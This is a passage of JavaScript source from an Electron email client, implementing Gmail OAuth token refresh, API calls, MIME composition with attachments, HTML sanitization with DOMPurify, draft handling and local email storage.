        req.setTimeout(15000, () => {
            req.destroy();
            console.error(`[gmail-oauth] Refresh timeout for ${email}`);
            resolve(null);
        });
        req.write(postData);
        req.end();
    });
}

async function getValidAccessToken(email) {
    // Prefer the unified Google token (newer macOS-style account flow).
    // Fall back to the legacy gmail-only token if no unified one exists,
    // so accounts connected before the unification still work.
    if (settingsStore.get(`googleTokens_${email}`, null)) {
        return await getValidGoogleToken(email);
    }

    const tokens = getGmailTokens(email);
    if (!tokens) return null;

    // If token is still valid (with 60s buffer)
    if (tokens.access_token && tokens.expiry && Date.now() < tokens.expiry - 60000) {
        return tokens.access_token;
    }

    // Refresh
    return await refreshAccessToken(email);
}

/**
 * Authenticated Gmail API call with automatic refresh-and-retry on 401.
 *
 * Use this instead of the manual `getValidAccessToken` + `gmailApiRequest`
 * pattern. It handles three situations the manual pattern doesn't:
 *   1. Token expires AFTER getValidAccessToken returned but BEFORE the
 *      request reaches Gmail (the proactive 60s buffer can't catch this).
 *   2. Token expires DURING a long batch fetch — every subsequent request
 *      in the batch can refresh and retry instead of all silently failing.
 *   3. Tokens get rotated server-side and our copy goes stale.
 *
 * On a 401 we force-refresh the token and retry the call exactly once.
 * Returns either the parsed Gmail response, or `{ error, needsReconnect: true }`
 * if there's no way to recover (refresh token gone or revoked).
 */
async function gmailApiCall(email, method, path, body = null) {
    let accessToken = await getValidAccessToken(email);
    if (!accessToken) {
        return { error: 'Not authenticated. Please reconnect your account.', needsReconnect: true };
    }

    let result = await gmailApiRequest(method, path, body, accessToken);

    // Detect 401 from Gmail's JSON error envelope
    const code = result?.error?.code || result?.error?.status;
    const is401 = code === 401 || code === 'UNAUTHENTICATED';

    if (is401) {
        console.log(`[gmail-api] 401 on ${method} ${path}, forcing token refresh and retry`);
        accessToken = await refreshAccessToken(email);
        if (!accessToken) {
            return { error: 'Authentication expired. Please reconnect your account.', needsReconnect: true };
        }
        result = await gmailApiRequest(method, path, body, accessToken);
    }

    // Detect SERVICE_DISABLED — Gmail API not enabled in the user's
    // Cloud Console project. Same handling as the calendar path.
    if (result?.error) {
        const details = result.error.details || [];
        const disabledInfo = details.find(d => d?.reason === 'SERVICE_DISABLED');
        const reason = result.error.errors?.[0]?.reason;
        if (disabledInfo || reason === 'accessNotConfigured') {
            const activationUrl = disabledInfo?.metadata?.activationUrl
                || 'https://console.cloud.google.com/apis/library/gmail.googleapis.com';
            return {
                error: `Gmail API is not enabled in your Cloud Console project. Enable it at ${activationUrl} then wait ~30 seconds and try again.`,
                needsApiEnable: true,
                activationUrl
            };
        }
    }

    return result;
}

function gmailApiRequest(method, path, body, accessToken) {
    return new Promise((resolve, reject) => {
        const bodyStr = body ? JSON.stringify(body) : null;
        const options = {
            hostname: 'gmail.googleapis.com',
            path: path,
            method: method,
            headers: {
                'Authorization': `Bearer ${accessToken}`,
                'Content-Type': 'application/json'
            }
        };
        if (bodyStr) {
            options.headers['Content-Length'] = Buffer.byteLength(bodyStr);
        }

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch { resolve(null); }
            });
        });

        req.on('error', reject);
        req.setTimeout(30000, () => { req.destroy(); reject(new Error('Gmail API timeout')); });

        if (bodyStr) req.write(bodyStr);
        req.end();
    });
}

function decodeBase64Url(str) {
    if (!str) return '';
    const padded = str.replace(/-/g, '+').replace(/_/g, '/');
    return Buffer.from(padded, 'base64').toString('utf8');
}

function extractEmailBody(payload) {
    if (!payload) return { bodyText: '', bodyHtml: '' };

    let bodyText = '';
    let bodyHtml = '';

    if (payload.body?.data) {
        const decoded = decodeBase64Url(payload.body.data);
        if (payload.mimeType === 'text/html') {
            bodyHtml = decoded;
        } else {
            bodyText = decoded;
        }
    }

    if (payload.parts) {
        for (const part of payload.parts) {
            if (part.mimeType === 'text/plain' && part.body?.data && !bodyText) {
                bodyText = decodeBase64Url(part.body.data);
            } else if (part.mimeType === 'text/html' && part.body?.data && !bodyHtml) {
                bodyHtml = decodeBase64Url(part.body.data);
            } else if (part.parts) {
                // Nested multipart
                const nested = extractEmailBody(part);
                if (!bodyText && nested.bodyText) bodyText = nested.bodyText;
                if (!bodyHtml && nested.bodyHtml) bodyHtml = nested.bodyHtml;
            }
        }
    }

    return { bodyText, bodyHtml };
}

function getHeader(headers, name) {
    const h = (headers || []).find(h => h.name.toLowerCase() === name.toLowerCase());
    return h ? h.value : '';
}

// Attachment metadata from a Gmail payload tree — anything with a filename
// and an attachmentId. Metadata only; bytes are fetched on demand via
// email-get-attachment / email-save-attachment.
function extractAttachmentsMeta(payload) {
    const attachments = [];
    (function walk(part) {
        if (!part) return;
        if (part.filename && part.body?.attachmentId) {
            attachments.push({
                filename: part.filename,
                mimeType: part.mimeType || 'application/octet-stream',
                size: Number(part.body.size) || 0,
                attachmentId: part.body.attachmentId
            });
        }
        (part.parts || []).forEach(walk);
    })(payload);
    return attachments;
}

// Minimal extension → MIME map for outgoing attachments. Gmail is the one
// actually rendering these, so we only need to cover the common cases; anything
// else falls through to application/octet-stream which Gmail handles fine.
const MIME_TYPES_BY_EXT = {
    pdf: 'application/pdf',
    png: 'image/png', jpg: 'image/jpeg', jpeg: 'image/jpeg', gif: 'image/gif',
    webp: 'image/webp', svg: 'image/svg+xml', heic: 'image/heic',
    txt: 'text/plain', csv: 'text/csv', md: 'text/markdown', html: 'text/html',
    json: 'application/json', xml: 'application/xml',
    doc: 'application/msword',
    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    xls: 'application/vnd.ms-excel',
    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    ppt: 'application/vnd.ms-powerpoint',
    pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    zip: 'application/zip',
    mp3: 'audio/mpeg', mp4: 'video/mp4', mov: 'video/quicktime', wav: 'audio/wav'
};

function mimeTypeForFilename(filename) {
    const ext = path.extname(filename || '').replace('.', '').toLowerCase();
    return MIME_TYPES_BY_EXT[ext] || 'application/octet-stream';
}

function buildMimeMessage({ from, to, cc, bcc, subject, body, inReplyTo, references, attachments }) {
    const headers = [];
    headers.push(`From: ${from}`);
    if (to) headers.push(`To: ${to}`);
    if (cc) headers.push(`Cc: ${cc}`);
    if (bcc) headers.push(`Bcc: ${bcc}`);
    headers.push(`Subject: ${subject || ''}`);
    if (inReplyTo) headers.push(`In-Reply-To: ${inReplyTo}`);
    if (references) headers.push(`References: ${references}`);
    headers.push('MIME-Version: 1.0');

    // Wrap body in a proper HTML email template with Inter font
    const htmlBody = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
body { margin: 0; padding: 0; }
</style>
</head>
<body>
<div style="font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:1.6;color:#1a1a1a;padding:16px 0;">
${body || ''}
</div>
</body>
</html>`;

    const hasAttachments = Array.isArray(attachments) && attachments.length > 0;

    if (!hasAttachments) {
        headers.push('Content-Type: text/html; charset=utf-8');
        headers.push('');
        headers.push(htmlBody);
        return headers.join('\r\n');
    }

    // multipart/mixed: one text/html body part + one part per attachment.
    // Boundary must not appear in any part, so we use a random token.
    const boundary = `=_anj_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
    headers.push(`Content-Type: multipart/mixed; boundary="${boundary}"`);
    headers.push('');

    const parts = [];
    parts.push(`--${boundary}`);
    parts.push('Content-Type: text/html; charset=utf-8');
    parts.push('Content-Transfer-Encoding: 7bit');
    parts.push('');
    parts.push(htmlBody);

    for (const att of attachments) {
        const safeName = String(att.filename || 'attachment').replace(/["\r\n]/g, '');
        const mime = att.mimeType || mimeTypeForFilename(safeName);
        const data = String(att.data || '').replace(/\s+/g, '');
        // Wrap base64 at 76 chars per RFC 2045. Gmail is lenient but other
        // receiving servers can choke on unwrapped lines.
        const wrapped = data.replace(/(.{76})/g, '$1\r\n');
        parts.push(`--${boundary}`);
        parts.push(`Content-Type: ${mime}; name="${safeName}"`);
        parts.push(`Content-Disposition: attachment; filename="${safeName}"`);
        parts.push('Content-Transfer-Encoding: base64');
        parts.push('');
        parts.push(wrapped);
    }

    parts.push(`--${boundary}--`);

    return headers.join('\r\n') + '\r\n' + parts.join('\r\n');
}

ipcMain.handle('email-fetch-emails', async (event, email, options = {}) => {
    try {
        const maxResults = options.maxResults || 50;
        let query = 'in:inbox OR in:sent OR in:starred';
        // Backfill support: only mail strictly older than this epoch-seconds
        // timestamp. Epoch form (not YYYY/MM/DD) so same-day mail isn't
        // skipped or endlessly re-fetched at the boundary.
        if (options.beforeTs) {
            query = `(${query}) before:${Math.floor(options.beforeTs)}`;
        }

        // List message IDs (with pagination support)
        let listUrl = `/gmail/v1/users/me/messages?maxResults=${maxResults}&q=${encodeURIComponent(query)}`;
        if (options.pageToken) {
            listUrl += `&pageToken=${encodeURIComponent(options.pageToken)}`;
        }

        const listResult = await gmailApiCall(email, 'GET', listUrl);

        if (listResult?.needsReconnect) {
            return { error: listResult.error };
        }
        if (listResult?.error) {
            return { error: listResult.error.message || listResult.error || 'Failed to list messages' };
        }

        const messageIds = (listResult?.messages || []).map(m => m.id);
        const nextPageToken = listResult?.nextPageToken || null;
        if (messageIds.length === 0) {
            return { emails: [], nextPageToken: null };
        }

        // Fetch each message (batch to avoid overwhelming)
        const emails = [];
        const batchSize = 10;

        for (let i = 0; i < messageIds.length; i += batchSize) {
            const batch = messageIds.slice(i, i + batchSize);
            const batchResults = await Promise.all(
                batch.map(id =>
                    gmailApiCall(email, 'GET', `/gmail/v1/users/me/messages/${id}?format=full`)
                )
            );

            for (const msg of batchResults) {
                if (!msg || msg.error) continue;

                const headers = msg.payload?.headers || [];
                const { bodyText, bodyHtml } = extractEmailBody(msg.payload);

                emails.push({
                    messageId: msg.id,
                    threadId: msg.threadId,
                    account: email,
                    from: getHeader(headers, 'From'),
                    to: getHeader(headers, 'To'),
                    cc: getHeader(headers, 'Cc'),
                    subject: getHeader(headers, 'Subject'),
                    date: getHeader(headers, 'Date'),
                    messageIdHeader: getHeader(headers, 'Message-ID'),
                    snippet: msg.snippet || '',
                    bodyText,
                    bodyHtml,
                    labels: msg.labelIds || [],
                    isRead: !(msg.labelIds || []).includes('UNREAD'),
                    isStarred: (msg.labelIds || []).includes('STARRED'),
                    internalDate: msg.internalDate,
                    attachments: extractAttachmentsMeta(msg.payload)
                });
            }
        }

        return { emails, nextPageToken };
    } catch (err) {
        console.error('Email fetch failed:', err);
        return { error: err.message || 'Failed to fetch emails' };
    }
});

// Reader-mode sanitizer. Foreign hostile HTML (any page on the web) is
// sanitized in main against an article-reader allowlist before the renderer
// innerHTML's it. DOMPurify + JSDOM is the same library the email path
// already uses; the renderer's prior hand-rolled DOM walker missed
// comment/PI nodes, SVG/MathML namespace confusion, and mutation-XSS bypass
// classes. URL resolution against the page's base href is done as a second
// pass here so the renderer never has to reach into raw href/src.
const READER_ALLOWED_TAGS = [
    'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li',
    'blockquote', 'pre', 'code',
    'em', 'strong', 'b', 'i', 'u', 's', 'sub', 'sup',
    'a', 'img', 'figure', 'figcaption',
    'br', 'hr',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'span', 'div'
];
const READER_ALLOWED_ATTRS = ['href', 'title', 'src', 'alt', 'target', 'rel', 'loading', 'referrerpolicy'];
ipcMain.handle('browse-sanitize-reader-html', async (event, payload) => {
    try {
        const html = String((payload && payload.html) || '');
        const baseUrl = String((payload && payload.baseUrl) || '');
        const win = new JSDOM('').window;
        const DOMPurify = createDOMPurify(win);
        const clean = DOMPurify.sanitize(html, {
            ALLOWED_TAGS: READER_ALLOWED_TAGS,
            ALLOWED_ATTR: READER_ALLOWED_ATTRS,
            ALLOW_DATA_ATTR: false,
            FORBID_TAGS: ['script', 'style', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'form', 'input', 'textarea', 'select', 'button', 'svg', 'math', 'noscript']
        });

        // Second pass: resolve relative URLs against baseUrl, drop anything
        // that doesn't resolve to http(s)/mailto (anchors) or http(s) (img),
        // and apply hardening attributes. DOMPurify gave us a script-free
        // tree; this only fixes up safe attributes.
        const doc = new JSDOM(`<div id="__root">${clean}</div>`).window.document;
        const root = doc.getElementById('__root');
        const resolve = (val) => { try { return new URL(val, baseUrl).toString(); } catch { return null; } };
        root.querySelectorAll('a[href]').forEach(a => {
            const r = resolve(a.getAttribute('href'));
            if (!r || !/^https?:|^mailto:/i.test(r)) { a.removeAttribute('href'); return; }
            a.setAttribute('href', r);
            a.setAttribute('target', '_blank');
            a.setAttribute('rel', 'noopener noreferrer');
        });
        root.querySelectorAll('img[src]').forEach(img => {
            const r = resolve(img.getAttribute('src'));
            if (!r || !/^https?:/i.test(r)) { img.removeAttribute('src'); return; }
            img.setAttribute('src', r);
            img.setAttribute('loading', 'lazy');
            img.setAttribute('referrerpolicy', 'no-referrer');
        });
        return { ok: true, html: root.innerHTML };
    } catch (e) {
        console.warn('[browse] reader sanitize failed:', e && (e.message || e));
        return { ok: false, error: (e && (e.message || String(e))) || 'sanitize failed' };
    }
});

ipcMain.on('email-sanitize-html-sync', (event, html) => {
    const window = new JSDOM('').window;
    const DOMPurify = createDOMPurify(window);
    // Permissive sanitization: preserve all layout/style elements,
    // strip only dangerous executable content
    event.returnValue = DOMPurify.sanitize(html, {
        WHOLE_DOCUMENT: true,
        // Block executable/interactive elements
        FORBID_TAGS: ['script', 'noscript', 'iframe', 'frame', 'frameset',
            'object', 'embed', 'applet',
            'form', 'input', 'textarea', 'select', 'button',
            'svg', 'math'],
        // Block all event handlers and dangerous attributes
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'ondblclick',
            'onmouseover', 'onmouseout', 'onmousedown', 'onmouseup', 'onmousemove',
            'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset',
            'onkeydown', 'onkeyup', 'onkeypress',
            'oncontextmenu', 'ontouchstart', 'ontouchend', 'ontouchmove',
            'formaction', 'xlink:href', 'data-bind'],
        ALLOW_DATA_ATTR: false,
        // Allow target attribute for links but we override in renderer
        ADD_ATTR: ['target']
    });
});

// Open URLs in default browser (for email links)
ipcMain.handle('email-open-external', async (event, url) => {
    // Only allow http/https URLs
    if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
        const { shell } = require('electron');
        await shell.openExternal(url);
    }
});

// Gmail History API — delta sync (only changes since last historyId)
ipcMain.handle('email-fetch-history', async (event, email, startHistoryId) => {
    try {
        const result = await gmailApiCall(
            email,
            'GET',
            `/gmail/v1/users/me/history?startHistoryId=${startHistoryId}&historyTypes=messageAdded&labelId=INBOX`
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) {
            // 404 means history expired — need full sync
            if (result.error.code === 404) {
                return { fullSyncRequired: true };
            }
            return { error: result.error.message || 'History fetch failed' };
        }

        const newMessageIds = [];
        if (result?.history) {
            for (const entry of result.history) {
                if (entry.messagesAdded) {
                    for (const msg of entry.messagesAdded) {
                        if (!newMessageIds.includes(msg.message.id)) {
                            newMessageIds.push(msg.message.id);
                        }
                    }
                }
            }
        }

        return {
            historyId: result.historyId || startHistoryId,
            newMessageIds
        };
    } catch (err) {
        return { error: err.message };
    }
});

// Fetch specific messages by ID
ipcMain.handle('email-fetch-messages-by-ids', async (event, email, messageIds) => {
    try {
        const emails = [];
        const batchSize = 10;

        for (let i = 0; i < messageIds.length; i += batchSize) {
            const batch = messageIds.slice(i, i + batchSize);
            const batchResults = await Promise.all(
                batch.map(id =>
                    gmailApiCall(email, 'GET', `/gmail/v1/users/me/messages/${id}?format=full`)
                )
            );

            for (const msg of batchResults) {
                if (!msg || msg.error) continue;

                const headers = msg.payload?.headers || [];
                const { bodyText, bodyHtml } = extractEmailBody(msg.payload);

                emails.push({
                    messageId: msg.id,
                    threadId: msg.threadId,
                    account: email,
                    from: getHeader(headers, 'From'),
                    to: getHeader(headers, 'To'),
                    cc: getHeader(headers, 'Cc'),
                    subject: getHeader(headers, 'Subject'),
                    date: getHeader(headers, 'Date'),
                    messageIdHeader: getHeader(headers, 'Message-ID'),
                    snippet: msg.snippet || '',
                    bodyText,
                    bodyHtml,
                    labels: msg.labelIds || [],
                    isRead: !(msg.labelIds || []).includes('UNREAD'),
                    isStarred: (msg.labelIds || []).includes('STARRED'),
                    internalDate: msg.internalDate,
                    attachments: extractAttachmentsMeta(msg.payload)
                });
            }
        }

        return { emails };
    } catch (err) {
        return { error: err.message };
    }
});

// Get Gmail profile (for initial historyId)
ipcMain.handle('email-get-profile', async (event, email) => {
    try {
        const result = await gmailApiCall(email, 'GET', '/gmail/v1/users/me/profile');
        if (result?.needsReconnect) return { error: result.error };
        return result;
    } catch (err) {
        return { error: err.message };
    }
});

ipcMain.handle('email-revoke-oauth', async (event, email) => {
    removeGmailTokens(email);
    return { success: true };
});

ipcMain.handle('email-mark-read', async (event, email, messageId) => {
    try {
        console.log('[mark-read] Marking', messageId, 'as read for', email);
        const result = await gmailApiCall(
            email,
            'POST',
            `/gmail/v1/users/me/messages/${messageId}/modify`,
            { removeLabelIds: ['UNREAD'] }
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) {
            return { error: result.error.message || 'Failed to mark as read' };
        }
        return { success: true };
    } catch (err) {
        console.error('[mark-read] Failed:', err);
        return { error: err.message || 'Failed to mark as read' };
    }
});

ipcMain.handle('email-modify-labels', async (event, email, messageId, addLabelIds, removeLabelIds) => {
    try {
        const body = {};
        if (addLabelIds?.length) body.addLabelIds = addLabelIds;
        if (removeLabelIds?.length) body.removeLabelIds = removeLabelIds;

        const result = await gmailApiCall(
            email,
            'POST',
            `/gmail/v1/users/me/messages/${messageId}/modify`,
            body
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) {
            return { error: result.error.message || 'Failed to modify labels' };
        }
        return { success: true };
    } catch (err) {
        console.error('[modify-labels] Failed:', err);
        return { error: err.message || 'Failed to modify labels' };
    }
});

ipcMain.handle('email-trash', async (event, email, messageId) => {
    try {
        const result = await gmailApiCall(
            email,
            'POST',
            `/gmail/v1/users/me/messages/${messageId}/trash`
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) {
            return { error: result.error.message || 'Failed to trash email' };
        }
        return { success: true };
    } catch (err) {
        console.error('[trash] Failed:', err);
        return { error: err.message || 'Failed to trash email' };
    }
});

ipcMain.handle('email-send', async (event, accountEmail, params) => {
    try {
        const mimeMessage = buildMimeMessage({
            from: accountEmail,
            to: params.to,
            cc: params.cc,
            bcc: params.bcc,
            subject: params.subject,
            body: params.body,
            inReplyTo: params.inReplyTo,
            references: params.references,
            attachments: params.attachments
        });

        const raw = Buffer.from(mimeMessage).toString('base64url');

        const requestBody = { raw };
        if (params.threadId) requestBody.threadId = params.threadId;

        const result = await gmailApiCall(
            accountEmail,
            'POST',
            '/gmail/v1/users/me/messages/send',
            requestBody
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) {
            console.error('[email-send] API error:', result.error);
            return { error: result.error.message || 'Failed to send email' };
        }

        console.log('[email-send] Sent successfully, messageId:', result.id);
        return { success: true, messageId: result.id };
    } catch (err) {
        console.error('[email-send] Failed:', err);
        return { error: err.message || 'Failed to send email' };
    }
});

// --- Gmail Drafts ---
// Drafts live server-side so they sync across devices automatically — same
// pattern as the inbox itself. We just build the same raw MIME as send and
// POST/PUT it to the drafts endpoint.

function buildDraftRequestBody(accountEmail, params) {
    const mimeMessage = buildMimeMessage({
        from: accountEmail,
        to: params.to,
        cc: params.cc,
        bcc: params.bcc,
        subject: params.subject,
        body: params.body,
        inReplyTo: params.inReplyTo,
        references: params.references,
        attachments: params.attachments
    });
    const raw = Buffer.from(mimeMessage).toString('base64url');
    const message = { raw };
    if (params.threadId) message.threadId = params.threadId;
    return { message };
}

ipcMain.handle('email-create-draft', async (event, accountEmail, params) => {
    try {
        const body = buildDraftRequestBody(accountEmail, params || {});
        const result = await gmailApiCall(accountEmail, 'POST', '/gmail/v1/users/me/drafts', body);
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to create draft' };
        return { success: true, draftId: result.id, messageId: result.message?.id };
    } catch (err) {
        console.error('[email-create-draft] Failed:', err);
        return { error: err.message || 'Failed to create draft' };
    }
});

ipcMain.handle('email-update-draft', async (event, accountEmail, draftId, params) => {
    try {
        if (!draftId) return { error: 'Missing draftId' };
        const body = buildDraftRequestBody(accountEmail, params || {});
        const result = await gmailApiCall(
            accountEmail,
            'PUT',
            `/gmail/v1/users/me/drafts/${encodeURIComponent(draftId)}`,
            body
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to update draft' };
        return { success: true, draftId: result.id, messageId: result.message?.id };
    } catch (err) {
        console.error('[email-update-draft] Failed:', err);
        return { error: err.message || 'Failed to update draft' };
    }
});

ipcMain.handle('email-delete-draft', async (event, accountEmail, draftId) => {
    try {
        if (!draftId) return { error: 'Missing draftId' };
        const result = await gmailApiCall(
            accountEmail,
            'DELETE',
            `/gmail/v1/users/me/drafts/${encodeURIComponent(draftId)}`
        );
        // DELETE returns empty body on success, which gmailApiRequest resolves to null
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to delete draft' };
        return { success: true };
    } catch (err) {
        console.error('[email-delete-draft] Failed:', err);
        return { error: err.message || 'Failed to delete draft' };
    }
});

ipcMain.handle('email-list-drafts', async (event, accountEmail) => {
    try {
        // List draft IDs, then fetch each with format=metadata to get headers
        // for the list view. Drafts rarely number in the hundreds, so we don't
        // paginate — capping at 50 mirrors the inbox fetch default.
        const listRes = await gmailApiCall(accountEmail, 'GET', '/gmail/v1/users/me/drafts?maxResults=50');
        if (listRes?.needsReconnect) return { error: listRes.error };
        if (listRes?.error) return { error: listRes.error.message || 'Failed to list drafts' };

        const drafts = listRes?.drafts || [];
        if (drafts.length === 0) return { drafts: [] };

        const results = await Promise.all(drafts.map(d =>
            gmailApiCall(accountEmail, 'GET',
                `/gmail/v1/users/me/drafts/${encodeURIComponent(d.id)}?format=metadata&metadataHeaders=To&metadataHeaders=Cc&metadataHeaders=Bcc&metadataHeaders=Subject&metadataHeaders=Date`)
        ));

        const parsed = [];
        for (const r of results) {
            if (!r || r.error) continue;
            const msg = r.message || {};
            const headers = msg.payload?.headers || [];
            parsed.push({
                draftId: r.id,
                messageId: msg.id,
                threadId: msg.threadId,
                account: accountEmail,
                to: getHeader(headers, 'To'),
                cc: getHeader(headers, 'Cc'),
                bcc: getHeader(headers, 'Bcc'),
                subject: getHeader(headers, 'Subject'),
                date: getHeader(headers, 'Date'),
                snippet: msg.snippet || '',
                internalDate: Number(msg.internalDate) || 0
            });
        }
        parsed.sort((a, b) => b.internalDate - a.internalDate);
        return { drafts: parsed };
    } catch (err) {
        console.error('[email-list-drafts] Failed:', err);
        return { error: err.message || 'Failed to list drafts' };
    }
});

ipcMain.handle('email-get-draft', async (event, accountEmail, draftId) => {
    try {
        if (!draftId) return { error: 'Missing draftId' };
        const result = await gmailApiCall(
            accountEmail,
            'GET',
            `/gmail/v1/users/me/drafts/${encodeURIComponent(draftId)}?format=full`
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to load draft' };

        const msg = result.message || {};
        const headers = msg.payload?.headers || [];
        const { bodyText, bodyHtml } = extractEmailBody(msg.payload);

        // Walk the payload tree for attachment parts — anything with a filename
        // and an attachmentId. We return metadata only here; raw data is
        // fetched on demand via email-get-attachment so reopening a draft
        // doesn't block on downloading megabytes.
        const attachments = [];
        function walk(part) {
            if (!part) return;
            if (part.filename && part.body?.attachmentId) {
                attachments.push({
                    filename: part.filename,
                    mimeType: part.mimeType || 'application/octet-stream',
                    size: Number(part.body.size) || 0,
                    attachmentId: part.body.attachmentId
                });
            }
            (part.parts || []).forEach(walk);
        }
        walk(msg.payload);

        return {
            draftId: result.id,
            messageId: msg.id,
            threadId: msg.threadId,
            to: getHeader(headers, 'To'),
            cc: getHeader(headers, 'Cc'),
            bcc: getHeader(headers, 'Bcc'),
            subject: getHeader(headers, 'Subject'),
            bodyText, bodyHtml,
            attachments,
            inReplyTo: getHeader(headers, 'In-Reply-To') || null,
            references: getHeader(headers, 'References') || null
        };
    } catch (err) {
        console.error('[email-get-draft] Failed:', err);
        return { error: err.message || 'Failed to load draft' };
    }
});

// Attachment metadata for an already-synced message — older cached emails
// predate the `attachments` field on the header record, so the viewer
// backfills it lazily with this (metadata only, no bytes).
ipcMain.handle('email-get-attachments-meta', async (event, accountEmail, messageId) => {
    try {
        if (!messageId) return { error: 'Missing messageId' };
        const result = await gmailApiCall(
            accountEmail,
            'GET',
            `/gmail/v1/users/me/messages/${encodeURIComponent(messageId)}?format=full`
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to load message' };
        return { attachments: extractAttachmentsMeta(result.payload) };
    } catch (err) {
        console.error('[email-get-attachments-meta] Failed:', err);
        return { error: err.message || 'Failed to load attachments' };
    }
});

// Download one attachment to disk via a save dialog.
ipcMain.handle('email-save-attachment', async (event, accountEmail, messageId, attachmentId, filename) => {
    try {
        if (!messageId || !attachmentId) return { error: 'Missing ids' };
        const result = await gmailApiCall(
            accountEmail,
            'GET',
            `/gmail/v1/users/me/messages/${encodeURIComponent(messageId)}/attachments/${encodeURIComponent(attachmentId)}`
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to fetch attachment' };

        const win = BrowserWindow.fromWebContents(event.sender);
        const safeName = String(filename || 'attachment').replace(/[\/\\]/g, '_');
        const { canceled, filePath } = await dialog.showSaveDialog(win, {
            defaultPath: path.join(app.getPath('downloads'), safeName)
        });
        if (canceled || !filePath) return { canceled: true };

        const b64 = String(result.data || '').replace(/-/g, '+').replace(/_/g, '/');
        fs.writeFileSync(filePath, Buffer.from(b64, 'base64'));
        return { saved: filePath };
    } catch (err) {
        console.error('[email-save-attachment] Failed:', err);
        return { error: err.message || 'Failed to save attachment' };
    }
});

ipcMain.handle('email-get-attachment', async (event, accountEmail, messageId, attachmentId) => {
    try {
        if (!messageId || !attachmentId) return { error: 'Missing ids' };
        const result = await gmailApiCall(
            accountEmail,
            'GET',
            `/gmail/v1/users/me/messages/${encodeURIComponent(messageId)}/attachments/${encodeURIComponent(attachmentId)}`
        );
        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to fetch attachment' };
        // Gmail returns base64url; our MIME builder wants standard base64.
        // Convert here so the renderer doesn't need to know the difference.
        const dataUrl = result.data || '';
        const standardB64 = dataUrl.replace(/-/g, '+').replace(/_/g, '/');
        return { data: standardB64, size: Number(result.size) || 0 };
    } catch (err) {
        console.error('[email-get-attachment] Failed:', err);
        return { error: err.message || 'Failed to fetch attachment' };
    }
});

// File picker for compose attachments. Read files in the main process — the
// renderer doesn't have fs access and we want this as base64 anyway to feed
// straight into the MIME builder.
ipcMain.handle('email-pick-attachments', async (event) => {
    const parent = BrowserWindow.fromWebContents(event.sender) || getActiveWindow();
    if (!parent) return { files: [] };
    const result = await dialog.showOpenDialog(parent, {
        properties: ['openFile', 'multiSelections'],
        title: 'Attach files'
    });
    if (result.canceled || !result.filePaths || result.filePaths.length === 0) {
        return { files: [] };
    }
    const files = [];
    for (const filePath of result.filePaths) {
        try {
            const stat = fs.statSync(filePath);
            const data = fs.readFileSync(filePath).toString('base64');
            files.push({
                filename: path.basename(filePath),
                mimeType: mimeTypeForFilename(filePath),
                size: stat.size,
                data
            });
        } catch (e) {
            console.warn('[email-pick-attachments] read failed:', filePath, e?.message);
        }
    }
    return { files };
});

// --- Email DB (per-message storage, not the kv blob) ---

function emailsDbReady() {
    return dataDb && dataDb.open;
}

function rowToEmail(row) {
    if (!row) return null;
    try {
        return JSON.parse(row.data);
    } catch {
        return null;
    }
}

function emailToRow(email) {
    // Strip the heavy body fields from the stored header — they live in
    // email_bodies. Never mutate the caller's object.
    const { bodyText: _bt, bodyHtml: _bh, ...header } = email;
    return {
        messageId: email.messageId,
        account: email.account || '',
        internalDate: Number(email.internalDate) || 0,
        isRead: email.isRead ? 1 : 0,
        isStarred: email.isStarred ? 1 : 0,
        labels: JSON.stringify(email.labels || []),
        data: JSON.stringify(header)
    };
}

// Whether an incoming email object actually carries body content. Flag-only
// re-persists (mark read, star, archive) of a never-opened message arrive with
// no body fields — those must NOT clobber the stored body.
function emailHasBody(email) {
    return email && (email.bodyText != null || email.bodyHtml != null);
}

ipcMain.handle('emails-list-by-accounts', (event, accounts) => {
    if (!emailsDbReady()) return [];
    if (!Array.isArray(accounts) || accounts.length === 0) return [];
    const placeholders = accounts.map(() => '?').join(',');
    const rows = dataDb
        .prepare(`SELECT data FROM emails WHERE account IN (${placeholders}) ORDER BY internalDate DESC`)
        .all(...accounts);
    return rows.map(rowToEmail).filter(Boolean);
});

ipcMain.handle('emails-get', (event, messageId) => {
    if (!emailsDbReady() || !messageId) return null;
    const row = dataDb.prepare('SELECT data FROM emails WHERE messageId = ?').get(messageId);
    return rowToEmail(row);
});

ipcMain.handle('emails-upsert-batch', (event, emails) => {
    if (!emailsDbReady() || !Array.isArray(emails) || emails.length === 0) return 0;
    const stmt = dataDb.prepare(`
        INSERT INTO emails (messageId, account, internalDate, isRead, isStarred, labels, data)
        VALUES (@messageId, @account, @internalDate, @isRead, @isStarred, @labels, @data)
        ON CONFLICT(messageId) DO UPDATE SET
            account = excluded.account,
            internalDate = excluded.internalDate,
